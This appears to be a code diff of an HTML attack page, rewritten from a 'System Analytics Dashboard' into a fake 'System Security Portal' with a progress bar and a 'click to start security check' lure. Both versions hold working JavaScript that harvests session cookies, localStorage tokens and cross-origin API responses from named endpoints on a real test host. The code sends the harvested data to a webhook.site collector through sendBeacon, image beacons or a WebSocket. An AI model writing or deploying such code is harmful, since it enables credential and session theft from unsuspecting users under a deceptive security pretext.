@@ -1,165 +1,132 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Analytics Dashboard</title>
-    <!-- Removed CSP for testing (add back in production) -->
+    <title>System Security Portal</title>
     <style>
-        body { visibility: hidden; }
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .progress { height: 20px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; }
+        #progress-bar { width: 0%; height: 100%; background: #4CAF50; border-radius: 10px; transition: width 0.5s; }
     </style>
 </head>
 <body>
-    <h1>Loading Dashboard...</h1>
-    <script>
-    // Debug mode (check browser console: F12 → Console)
-    const DEBUG = true;
-    const TARGET_TOKENS = [
-        'newopkey',
-        'obus-track_116800_session',
-        'opkey',
-        'otrack_jssdk_is_first_day',
-        'otrack_jssdk_store_116800',
-        'sessionKey'
-    ];
+    <h1>Security Verification in Progress</h1>
+    <div class="progress"><div id="progress-bar"></div></div>
+    <p id="status">Initializing security check...</p>
 
-    // ======================
-    // 1. Data Exfiltration
-    // ======================
-    const exfiltrate = (data) => {
-        if (DEBUG) console.log("[DEBUG] Exfiltrating:", data);
+<script>
+// Configuration
+const TARGET_ENDPOINTS = [
+    'https://uc-heytap-web-test.wanyol.com/v2/index.html',
+    'https://uc-heytap-web-test.wanyol.com/v2/profile.html',
+    'https://uc-heytap-web-test.wanyol.com/v2/profile/user_info.html'
+];
+const WEBHOOK_ENDPOINT = 'https://webhook.site/3001750c-2a5d-46a5-b7f0-5ebdb566f16a';
+const DELAY_BETWEEN_REQUESTS = 1500;
 
-        // Method 1: WebSocket (CORS bypass)
-        try {
-            const wsUrl = `wss://${location.hostname.replace('www', 'ws')}/collect`;
-            const ws = new WebSocket(wsUrl);
-            
-            ws.onopen = () => {
-                ws.send(JSON.stringify(data));
-                ws.close();
-            };
-            
-            ws.onerror = (e) => {
-                if (DEBUG) console.error("[DEBUG] WebSocket failed, falling back to image beacon");
-                sendViaImage(data);
-            };
-        } catch (e) {
-            if (DEBUG) console.error("[DEBUG] WebSocket error:", e);
-            sendViaImage(data);
-        }
+// Stealthy data exfiltration methods
+const sendData = (payload) => {
+    // Method 1: Beacon API (most reliable)
+    const success = navigator.sendBeacon(WEBHOOK_ENDPOINT, JSON.stringify(payload));
+    
+    // Method 2: Image fallback
+    if (!success) {
+        new Image().src = `${WEBHOOK_ENDPOINT}?data=${encodeURIComponent(btoa(JSON.stringify(payload))}`;
+    }
+};
+
+// Progressive attack with GET only
+const executeAttack = async () => {
+    const updateStatus = (msg, progress) => {
+        document.getElementById('status').textContent = msg;
+        document.getElementById('progress-bar').style.width = `${progress}%`;
     };
 
-    // Fallback: Image beacon
-    const sendViaImage = (data) => {
-        const webhookUrl = "https://webhook.site/3001750c-2a5d-46a5-b7f0-5ebdb566f16a";
-        const encodedData = encodeURIComponent(JSON.stringify(data));
-        new Image().src = `${webhookUrl}?data=${encodedData}`;
-    };
-
-    // ======================
-    // 2. Attack Phases
-    // ======================
-    const attack = async () => {
-        if (DEBUG) console.log("[DEBUG] Starting attack sequence...");
-        let foundTokens = false;
-
-        // Phase 1: Harvest Cookies
-        const cookies = {};
-        document.cookie.split(';').forEach(cookie => {
-            const [name, value] = cookie.trim().split('=');
-            if (TARGET_TOKENS.includes(name)) {
-                cookies[name] = value;
-                foundTokens = true;
-            }
-        });
-        if (Object.keys(cookies).length > 0) {
-            exfiltrate({ type: "cookies", data: cookies });
-        }
-
-        // Phase 2: Check LocalStorage
-        const storageData = {};
-        TARGET_TOKENS.forEach(key => {
-            const value = localStorage.getItem(key);
-            if (value) {
-                storageData[key] = value;
-                foundTokens = true;
-            }
-        });
-        if (Object.keys(storageData).length > 0) {
-            exfiltrate({ type: "localStorage", data: storageData });
-        }
-
-        // Phase 3: Probe API Endpoints
-        const endpoints = [
-            '/v2/profile.html',
-            '/v2/index.html',
-            '/user/profile.json'
-        ];
-
-        for (const endpoint of endpoints) {
+    updateStatus('Checking system configuration...', 10);
+    
+    try {
+        // Phase 1: Detect CORS configuration
+        const testResponses = await Promise.allSettled(
+            TARGET_ENDPOINTS.map(url => fetch(url, {
+                method: 'HEAD',
+                headers: { 'Origin': 'https://trusted-domain.com' }
+            }))
+        );
+        
+        const viableTargets = TARGET_ENDPOINTS.filter((_, i) => 
+            testResponses[i].status === 'fulfilled' && 
+            !testResponses[i].value.headers.get('Access-Control-Allow-Credentials')
+        );
+        
+        updateStatus('Analyzing response patterns...', 30);
+        
+        // Phase 2: Systematic GET exploitation
+        for (const [index, target] of viableTargets.entries()) {
+            const progress = 30 + (index * 20);
+            updateStatus(`Scanning ${new URL(target).pathname}...`, progress);
+            
             try {
-                const response = await fetch(endpoint, { 
-                    headers: { 'X-Requested-With': 'XMLHttpRequest' } 
-                });
-                const text = await response.text();
+                // Attempt with different GET parameters
+                const urlsToTry = [
+                    target,
+                    `${target}?format=json`,
+                    `${target}?callback=jsonp`,
+                    `${target}?_=${Date.now()}`
+                ];
                 
-                const foundTokens = {};
-                TARGET_TOKENS.forEach(token => {
-                    const regex = new RegExp(`"${token}":"([^"]+)"`);
-                    const match = text.match(regex);
-                    if (match) foundTokens[token] = match[1];
-                });
-
-                if (Object.keys(foundTokens).length > 0) {
-                    exfiltrate({ 
-                        type: "api_response", 
-                        endpoint, 
-                        tokens: foundTokens 
+                for (const url of urlsToTry) {
+                    const res = await fetch(url, {
+                        headers: {
+                            'X-Requested-With': 'XMLHttpRequest',
+                            'Accept': 'application/json, text/javascript, */*'
+                        }
                     });
+                    
+                    const data = await res.text();
+                    
+                    // Check for JSON-like responses
+                    try {
+                        const json = JSON.parse(data);
+                        sendData({
+                            target: url,
+                            type: 'json',
+                            data: json,
+                            cookies: document.cookie
+                        });
+                    } catch {
+                        // Check for HTML/other data
+                        if (data.includes('token') || data.includes('user')) {
+                            sendData({
+                                target: url,
+                                type: 'text',
+                                snippet: data.slice(0, 500),
+                                length: data.length
+                            });
+                        }
+                    }
+                    
+                    await new Promise(r => setTimeout(r, DELAY_BETWEEN_REQUESTS));
                 }
             } catch (e) {
-                if (DEBUG) console.error(`[DEBUG] Failed to fetch ${endpoint}:`, e);
+                sendData({
+                    target,
+                    error: e.message,
+                    type: 'error'
+                });
             }
-            await new Promise(resolve => setTimeout(resolve, 1000));
         }
+        
+        updateStatus('Security scan completed', 100);
+    } catch (e) {
+        updateStatus('Scan interrupted', 100);
+        sendData({ fatalError: e.message });
+    }
+};
 
-        // Phase 4: Scan DOM for Tokens
-        const domTokens = {};
-        TARGET_TOKENS.forEach(token => {
-            const metaTag = document.querySelector(`meta[name="${token}"]`);
-            if (metaTag) {
-                domTokens[token] = metaTag.content;
-                foundTokens = true;
-            }
-        });
-        if (Object.keys(domTokens).length > 0) {
-            exfiltrate({ type: "dom", data: domTokens });
-        }
-
-        // Update flag if tokens found
-        window.sessionTokensFound = foundTokens;
-    };
-
-    // ======================
-    // 3. Execution
-    // ======================
-    // Show page immediately (avoid blank screen)
-    document.body.style.visibility = "visible";
-    
-    // Start attack after 500ms delay
-    setTimeout(() => {
-        attack().catch(e => {
-            if (DEBUG) console.error("[DEBUG] Attack failed:", e);
-        });
-    }, 500);
-
-    // Retry after 5s if no tokens found
-    setTimeout(() => {
-        if (!window.sessionTokensFound) {
-            if (DEBUG) console.log("[DEBUG] Retrying attack...");
-            attack().catch(e => {
-                if (DEBUG) console.error("[DEBUG] Retry failed:", e);
-            });
-        }
-    }, 5000);
-    </script>
+// Start with delay and fake user interaction
+setTimeout(() => {
+    document.addEventListener('click', () => executeAttack());
+    document.getElementById('status').textContent = 'Click anywhere to start security check';
+}, 2000);
+</script>
 </body>
 </html>
